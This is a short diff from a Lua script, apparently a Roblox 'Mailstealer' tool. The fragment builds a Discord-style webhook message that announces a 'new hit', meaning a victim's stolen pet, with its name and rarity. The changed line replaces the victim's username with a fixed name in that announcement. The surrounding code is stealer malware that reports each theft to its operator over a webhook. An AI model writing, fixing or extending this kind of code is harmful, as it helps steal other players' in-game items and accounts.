@@ -21,7 +21,7 @@ _G.PetName = v2.name
 _G.PetRar = v2.rarity
 local function sendwebhook()
     local msg = {
-        ["content"] = "|| @everyone ||**Hello ".._G.UserName..", Hostee Scriptz Mailstealer has detected a new hit!**",
+        ["content"] = "|| @everyone ||**Hello HosteeSciptz, Hostee Scriptz Mailstealer has detected a new hit!**",
         ["embeds"] = {
             {
                 ["title"] = "Hostee Scriptz Mailstealer Results",
